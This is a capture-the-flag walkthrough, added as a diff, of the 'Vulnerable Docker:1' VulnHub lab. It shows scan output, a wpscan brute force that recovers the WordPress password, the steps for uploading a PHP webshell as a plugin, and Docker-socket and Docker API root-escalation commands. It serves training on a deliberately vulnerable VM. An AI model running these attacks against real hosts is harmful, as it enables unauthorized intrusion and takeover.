@@ -1,0 +1,3330 @@
+=======================================================================================================
+Walkthrough of the 'Vulnerable Docker:1' VulnHub CTF
+=======================================================================================================
+
+Vulnerable Docker VM that contained 2 modes (https://www.vulnhub.com/entry/vulnerable-docker-1,208/ - www.notsosecure.com)
+--------------------------------------------------------------------------------------------------------------------------
+> 'HARD': This would require you to combine your docker skills as well as your pen-testing skills to achieve host compromise.
+> 'EASY': Relatively easier path, knowing docker would be enough to compromise the machine and gain root on the host machines.
+
+Mode 'Hard'
+-----------
+
+Step 1. Scanning & Enumeration (Nmap + Nikto + WPscan)
+	    + SSH server (22/tcp)
+	    + Wordpress website (8000/tcp) - 1 user account identified: 'bob'
+
+Step 2. Gaining access
+
+     	1. Perform a password brute force attack against the Wordpress user account 'bob' and find its password
+  
+    	2. Upload a PHP Webshell (manually or with Metasploit) using the functionality 'add a plugin' 
+    	=> Gain access to the Docker image hosting the WordPress
+
+Step 3. Post-Exploitation and Privilege escalation to become Root
+
+    	1. Review the configuration of the docker image (look for privesc flaws + information gathering)...
+
+    	2. Set up a pivot to attack the other docker images available on the 'docker' network 
+         Note: it can be done via many techniques such as a meterpreter shell + portfwd rule or using proxychains and the ReGeorg webshell (it tunnels TCP connection over HTTP)  
+
+    	3. Find out that there is an unprotected/insecure Docker SSH Proxy container and obtain root access on this container
+
+	    4. Review the configuration of this docker container and find out that the docker socket (which is running as root on the Linux host) is exposed in the docker container
+
+	    5. Download and install the docker client in this unprotected docker container
+
+	    6. Perform a privilege escalation attack using the docker client and the exposed docker socket (i.e. run a new container with a volume pointing to the root folder of the hosting Linux server)
+	    => Gain root access to the underlying Linux server 'vulndocker' and to the 3 docker containers
+
+	    7. Create a new account on the Linux server 'vulndocker' and ssh to it.. 
+
+
+Mode 'Easy'
+-----------
+
+Step 1. Scanning & Enumeration (Nmap + Docker client)
+	    + SSH server (22/tcp)
+	    + Anonymous access to the Docker API v. 17.06.0-ce(2375/tcp)
+
+Step 2. Gaining access and Privilege escalation to become Root
+
+    	1. Use the command 'docker -H tcp://<IP> exec -it <container id> <OS command>' to remotely execute OS command as root on the 3 docker containers.
+    	=> Gain root access on the 3 docker containers
+
+    	2. Use the docker client to remotely run a new wordpress container with a volume pointing to the root folder of the hosting Linux server.
+	    => Gain root access on the Linux server 'vulndocker' which is hosting docker
+	
+    	3. Create a new Linux account, then add it to the docker group and finally use it to run the tool 'Docker Bench for Security' that checks 
+      for dozens of common best-practices around deploying Docker containers in production (https://github.com/docker/docker-bench-security)
+    	
+      => Numerous docker configuration weaknesses (warnings) are identified by the tool such as:
+    	[WARN] 2.1  - Ensure network traffic is restricted between containers on the default bridge
+    	[WARN] 2.11  - Ensure that authorization for Docker client commands is enabled
+    	[WARN] 2.17  - Ensure containers are restricted from acquiring new privileges
+    	[WARN] 4.1  - Ensure a user for the container has been created
+    	[WARN]      * Running as root: content_wordpress_1
+    	[WARN]      * Running as root: content_db_1
+    	[WARN]      * Running as root: content_ssh_1
+    	[WARN] 5.12  - Ensure that the container's root filesystem is mounted as read only
+    	[WARN]      * Container running with root FS mounted R/W: content_wordpress_1
+    	[WARN]      * Container running with root FS mounted R/W: content_db_1
+    	[WARN]      * Container running with root FS mounted R/W: content_ssh_1
+     	[WARN] 5.25  - Ensure that the container is restricted from acquiring additional privileges
+    	[WARN]      * Privileges not restricted: content_wordpress_1
+     	[WARN]      * Privileges not restricted: content_db_1
+    	[WARN]      * Privileges not restricted: content_ssh_1
+    	[WARN] 5.31  - Ensure that the Docker socket is not mounted inside any containers
+    	[WARN]      * Docker socket shared: content_db_1
+    	[WARN]      * Docker socket shared: content_ssh_1
+
+
+Useful resources / urls regarding docker security:
+> https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
+> https://github.com/OWASP/Docker-Security
+> https://www.digitalocean.com/community/tutorials/how-to-audit-docker-host-security-with-docker-bench-for-security-on-ubuntu-16-04
+
+
+****************************************** 'HARD' mode ************************************************
+
+=======================================================================================================
+Step 1. Scanning & Enumeration (Nmap + Nikto + WPscan)
+=======================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# netdiscover
+ Currently scanning: 192.168.25.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.3     14:0c:76:53:4d:4e      1      60  FREEBOX SAS                 
+ 192.168.1.29    f4:5c:89:c9:be:c5      1      60  Apple, Inc.                 
+ 192.168.1.39    08:00:27:f3:95:3b      1      60  PCS Systemtechnik GmbH      
+ 192.168.1.254   68:a3:78:8b:0c:dd      1      60  FREEBOX SAS   
+
+=======================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# nmap -sS -sV -Pn -sC -v -p 1-65535 192.168.1.39
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-16 23:36 CET
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Nmap scan report for 192.168.1.39
+Host is up (0.00031s latency).
+Not shown: 65533 closed ports
+
+PORT     STATE SERVICE VERSION
+
+22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 45:13:08:81:70:6d:46:c3:50:ed:3c:ab:ae:d6:e1:85 (DSA)
+|   2048 4c:e7:2b:01:52:16:1d:5c:6b:09:9d:3d:4b:bb:79:90 (RSA)
+|   256 cc:2f:62:71:4c:ea:6c:a6:d8:a7:4f:eb:82:2a:22:ba (ECDSA)
+|_  256 73:bf:b4:d6:ad:51:e3:99:26:29:b7:42:e3:ff:c3:81 (ED25519)
+
+8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+|_http-generator: WordPress 4.8.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: NotSoEasy Docker &#8211; Just another WordPress site
+|_http-trane-info: Problem with XML parsing of /evox/about
+
+MAC Address: 08:00:27:F3:95:3B (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+
+
+=======================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# ssh bob@192.168.1.39
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the ECDSA key sent by the remote host is
+SHA256:iMM5I1uQqleM9fe/JBCQcZp73GOjgDxxR/EB4Gwf1QI.
+Please contact your system administrator.
+Add correct host key in /root/.ssh/known_hosts to get rid of this message.
+Offending ECDSA key in /root/.ssh/known_hosts:4
+  remove with:
+  ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.1.39"
+ECDSA host key for 192.168.1.39 has changed and you have requested strict checking.
+Host key verification failed.
+
+
+=======================================================================================================
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# nikto -h http://192.168.1.39:8000
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.39
++ Target Hostname:    192.168.1.39
++ Target Port:        8000
++ Start Time:         2020-03-16 23:44:15 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 (Debian)
++ Retrieved x-powered-by header: PHP/5.6.31
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <http://192.168.1.39/wp-json/>; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Entry '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ Entry '/wp-admin/admin-ajax.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 2 entries which should be manually viewed.
++ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3092: /home/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-62684: /wp-content/plugins/hello.php: The WordPress hello.php plugin reveals a file system path
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
++ /wordpresswp-app.log: Wordpress' wp-app.log may leak application/system details.
++ /: A Wordpress installation was found.
++ /wordpress: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login.php: Wordpress login found
++ 7921 requests: 0 error(s) and 21 item(s) reported on remote host
++ End Time:           2020-03-16 23:58:42 (GMT1) (867 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+=======================================================================================================
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# wpscan --url http://192.168.1.39:8000/
+_______________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-09-30
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > N
+[+] URL: http://192.168.1.39:8000/
+[+] Started: Tue Mar 17 00:03:43 2020
+
+[+] Interesting header: LINK: <http://192.168.1.39:8000/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
+[+] Interesting header: X-POWERED-BY: PHP/5.6.31
+[+] robots.txt available under: http://192.168.1.39:8000/robots.txt   [HTTP 200]
+[+] XML-RPC Interface available under: http://192.168.1.39:8000/xmlrpc.php   [HTTP 405]
+[+] API exposed: http://192.168.1.39:8000/wp-json/   [HTTP 200]
+[!] 1 user exposed via API: http://192.168.1.39:8000/wp-json/wp/v2/users
++----+------+--------------------------------------+
+| ID | Name | URL                                  |
++----+------+--------------------------------------+
+| 1  | bob  | http://192.168.1.39:8000/author/bob/ |
++----+------+--------------------------------------+
+[+] Found an RSS Feed: http://192.168.1.39:8000/feed/   [HTTP 200]
+[!] Detected 2 users from RSS feed:
++------+
+| Name |
++------+
+
+| bob  |
++------+
+[!] Full Path Disclosure (FPD) in 'http://192.168.1.39:8000/wp-includes/rss-functions.php': 
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.8.1 (Released on 2017-08-02) identified from meta generator, stylesheets numbers
+[!] 18 vulnerabilities identified from the version number
+
+[!] Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8905
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
+    Reference: https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 2.9.2-4.8.1 - Open Redirect
+    Reference: https://wpvulndb.com/vulnerabilities/8910
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41398
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
+    Reference: https://wpvulndb.com/vulnerabilities/8911
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41457
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.4-4.8.1 - Path Traversal in Customizer 
+    Reference: https://wpvulndb.com/vulnerabilities/8912
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41397
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14722
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.4-4.8.1 - Cross-Site Scripting (XSS) in oEmbed
+    Reference: https://wpvulndb.com/vulnerabilities/8913
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41448
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14724
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 4.2.3-4.8.1 - Authenticated Cross-Site Scripting (XSS) in Visual Editor
+    Reference: https://wpvulndb.com/vulnerabilities/8914
+    Reference: https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/changeset/41395
+    Reference: https://blog.sucuri.net/2017/09/stored-cross-site-scripting-vulnerability-in-wordpress-4-8-1.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14726
+[i] Fixed in: 4.8.2
+
+[!] Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
+    Reference: https://wpvulndb.com/vulnerabilities/8807
+    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
+    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
+    Reference: https://core.trac.wordpress.org/ticket/25239
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
+
+[!] Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
+    Reference: https://wpvulndb.com/vulnerabilities/8941
+    Reference: https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
+    Reference: https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
+    Reference: https://twitter.com/ircmaxell/status/923662170092638208
+    Reference: https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
+[i] Fixed in: 4.8.3
+
+[!] Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
+    Reference: https://wpvulndb.com/vulnerabilities/8966
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
+[i] Fixed in: 4.8.4
+
+[!] Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
+    Reference: https://wpvulndb.com/vulnerabilities/8967
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
+[i] Fixed in: 4.8.4
+
+[!] Title: WordPress 4.3.0-4.9 - HTML Language Attribute Escaping
+    Reference: https://wpvulndb.com/vulnerabilities/8968
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/3713ac5ebc90fb2011e98dfd691420f43da6c09a
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17093
+[i] Fixed in: 4.8.4
+
+[!] Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
+    Reference: https://wpvulndb.com/vulnerabilities/8969
+    Reference: https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
+[i] Fixed in: 4.8.4
+
+[!] Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
+    Reference: https://wpvulndb.com/vulnerabilities/9006
+    Reference: https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
+    Reference: https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
+    Reference: https://core.trac.wordpress.org/ticket/42720
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
+[i] Fixed in: 4.8.5
+
+[!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
+    Reference: https://wpvulndb.com/vulnerabilities/9021
+    Reference: https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
+    Reference: https://github.com/quitten/doser.py
+    Reference: https://thehackernews.com/2018/02/wordpress-dos-exploit.html
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
+    Reference: https://wpvulndb.com/vulnerabilities/9053
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
+[i] Fixed in: 4.8.6
+
+[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
+    Reference: https://wpvulndb.com/vulnerabilities/9054
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
+[i] Fixed in: 4.8.6
+
+[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
+    Reference: https://wpvulndb.com/vulnerabilities/9055
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
+[i] Fixed in: 4.8.6
+
+[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
+    Reference: https://wpvulndb.com/vulnerabilities/9100
+    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
+    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
+    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
+    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
+[i] Fixed in: 4.8.7
+
+[+] WordPress theme in use: twentyseventeen - v1.3
+
+[+] Name: twentyseventeen - v1.3
+ |  Last updated: 2018-08-02T00:00:00.000Z
+ |  Location: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/
+ |  Readme: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/README.txt
+[!] The version is out of date, the latest version is 1.7
+ |  Style URL: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/style.css
+ |  Theme Name: Twenty Seventeen
+ |  Theme URI: https://wordpress.org/themes/twentyseventeen/
+ |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found passively
+
+[+] Finished: Tue Mar 17 00:03:54 2020
+[+] Elapsed time: 00:00:10
+[+] Requests made: 395
+[+] Memory used: 48.211 MB
+root@Security-Audit-01:~/Deskt
+
+=======================================================================================================
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# wpscan --url http://192.168.1.39:8000/ --enumerate U
+_____________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-09-30
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > N
+[+] URL: http://192.168.1.39:8000/
+[+] Started: Tue Mar 17 00:07:00 2020
+
+[+] Interesting header: LINK: <http://192.168.1.39:8000/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
+[+] Interesting header: X-POWERED-BY: PHP/5.6.31
+[+] robots.txt available under: http://192.168.1.39:8000/robots.txt   [HTTP 200]
+[+] XML-RPC Interface available under: http://192.168.1.39:8000/xmlrpc.php   [HTTP 405]
+[+] API exposed: http://192.168.1.39:8000/wp-json/   [HTTP 200]
+[!] 1 user exposed via API: http://192.168.1.39:8000/wp-json/wp/v2/users
++----+------+--------------------------------------+
+| ID | Name | URL                                  |
++----+------+--------------------------------------+
+| 1  | bob  | http://192.168.1.39:8000/author/bob/ |
++----+------+--------------------------------------+
+[+] Found an RSS Feed: http://192.168.1.39:8000/feed/   [HTTP 200]
+[!] Detected 2 users from RSS feed:
++------+
+| Name |
++------+
+
+| bob  |
++------+
+[!] Full Path Disclosure (FPD) in 'http://192.168.1.39:8000/wp-includes/rss-functions.php': 
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.8.12 
+
+[+] WordPress theme in use: twentyseventeen - v1.3
+
+[+] Name: twentyseventeen - v1.3
+ |  Last updated: 2018-08-02T00:00:00.000Z
+ |  Location: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/
+ |  Readme: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/README.txt
+[!] The version is out of date, the latest version is 1.7
+ |  Style URL: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/style.css
+ |  Theme Name: Twenty Seventeen
+ |  Theme URI: https://wordpress.org/themes/twentyseventeen/
+ |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found passively
+
+[+] Enumerating usernames ...
+[+] We identified the following 1 user:
+    +----+-------+-----------------+
+    | ID | Login | Name            |
+    +----+-------+-----------------+
+    | 1  | bob   | bob – NotSoEasy |
+    +----+-------+-----------------+
+
+[+] Finished: Tue Mar 17 00:07:10 2020
+[+] Elapsed time: 00:00:09
+
+
+
+=======================================================================================================
+Step 2. Gaining access
+=======================================================================================================
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Docker# wpscan --url http://192.168.1.39:8000/ --wordlist /usr/share/wordlists/rockyou.txt --username bob
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9.4
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2018-09-30
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > N
+[+] URL: http://192.168.1.39:8000/
+[+] Started: Tue Mar 17 00:08:17 2020
+
+[+] Interesting header: LINK: <http://192.168.1.39:8000/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
+[+] Interesting header: X-POWERED-BY: PHP/5.6.31
+[+] robots.txt available under: http://192.168.1.39:8000/robots.txt   [HTTP 200]
+[+] XML-RPC Interface available under: http://192.168.1.39:8000/xmlrpc.php   [HTTP 405]
+[+] API exposed: http://192.168.1.39:8000/wp-json/   [HTTP 200]
+[!] 1 user exposed via API: http://192.168.1.39:8000/wp-json/wp/v2/users
++----+------+--------------------------------------+
+| ID | Name | URL                                  |
++----+------+--------------------------------------+
+| 1  | bob  | http://192.168.1.39:8000/author/bob/ |
++----+------+--------------------------------------+
+[+] Found an RSS Feed: http://192.168.1.39:8000/feed/   [HTTP 200]
+[!] Detected 2 users from RSS feed:
++------+
+| Name |
++------+
+
+| bob  |
++------+
+[!] Full Path Disclosure (FPD) in 'http://192.168.1.39:8000/wp-includes/rss-functions.php': 
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 4.8.12 
+
+[+] WordPress theme in use: twentyseventeen - v1.3
+
+[+] Name: twentyseventeen - v1.3
+ |  Last updated: 2018-08-02T00:00:00.000Z
+ |  Location: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/
+ |  Readme: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/README.txt
+[!] The version is out of date, the latest version is 1.7
+ |  Style URL: http://192.168.1.39:8000/wp-content/themes/twentyseventeen/style.css
+ |  Theme Name: Twenty Seventeen
+ |  Theme URI: https://wordpress.org/themes/twentyseventeen/
+ |  Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+[+] No plugins found passively
+[+] Starting the password brute forcer
+  [+] [SUCCESS] Login : bob Password : Welcome1                                                                                                                                                           
+
+  Brute Forcing 'bob' Time: 00:15:30 <     > (40387 / 14344393)  0.28%  ETA: 91:30:49
+  +----+-------+------+----------+
+  | ID | Login | Name | Password |
+  +----+-------+------+----------+
+  |    | bob   |      | Welcome1 |
+  +----+-------+------+----------+
+
+[+] Finished: Tue Mar 17 00:23:58 2020
+[+] Elapsed time: 00:15:41
+[+] Requests made: 40788
+[+] Memory used: 31.848 MB
+
+
+======================================================================================
+
+
+A basic brute force allow to identify the following weak credentials: "bob:welcome1"
+
+The 'bob' account is administrator of the Wordpress website and I found the 1rst flag in the 'Dashboard' page
+
+"Drafts
+
+flag_1January 19, 2017
+2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998 good job finding this one. Now Lets hunt for…"
+
+
+Then I uploaded a webshell...
+
+> Step 1. Log into the Wordpress website as 'bob' => http://192.168.1.39:8000/wp-login.php
+
+> Step 2. Go to the PLUGINS section 		  => http://192.168.1.39:8000/wp-admin/plugins.php
+
+> Step 3. Click on 'add a new plugin'		  => http://192.168.1.39:8000/wp-admin/update.php?action=upload-plugin
+
+> Step 4. Upload a PHP webshell			  => http://192.168.1.39:8000/wp-admin/plugins.php
+
+> Step 5. Go to the following page 		  => http://192.168.1.39:8000/wp-content/uploads/2020/03/webshell.php
+
+
+-rw-r--r-- 1 www-data www-data 7205 Mar 16 23:33 /var/www/html/wp-content/uploads/2020/03/webshell.php
+
+
+ls -al /var/www/html
+total 204
+drwxr-xr-x  5 www-data www-data  4096 Mar 16 23:03 .
+drwxr-xr-x  4 root     root      4096 Jul 24  2017 ..
+-rw-r--r--  1 www-data www-data   235 Aug 19  2017 .htaccess
+-rw-r--r--  1 www-data www-data   418 Sep 25  2013 index.php
+-rw-r--r--  1 www-data www-data 19935 Mar 16 23:03 license.txt
+-rw-r--r--  1 www-data www-data  7413 Mar 16 23:03 readme.html
+-rw-r--r--  1 www-data www-data  6864 Mar 16 23:03 wp-activate.php
+drwxr-xr-x  9 www-data www-data  4096 Aug  2  2017 wp-admin
+-rw-r--r--  1 www-data www-data   364 Dec 19  2015 wp-blog-header.php
+-rw-r--r--  1 www-data www-data  1627 Aug 29  2016 wp-comments-post.php
+-rw-r--r--  1 www-data www-data  2764 Mar 16 22:31 wp-config-sample.php
+-rw-r--r--  1 root     root      3281 Mar 16 22:31 wp-config.php
+drwxr-xr-x  6 www-data www-data  4096 Mar 17 00:12 wp-content
+-rw-r--r--  1 www-data www-data  3286 May 24  2015 wp-cron.php
+drwxr-xr-x 18 www-data www-data 12288 Aug  2  2017 wp-includes
+-rw-r--r--  1 www-data www-data  2422 Nov 21  2016 wp-links-opml.php
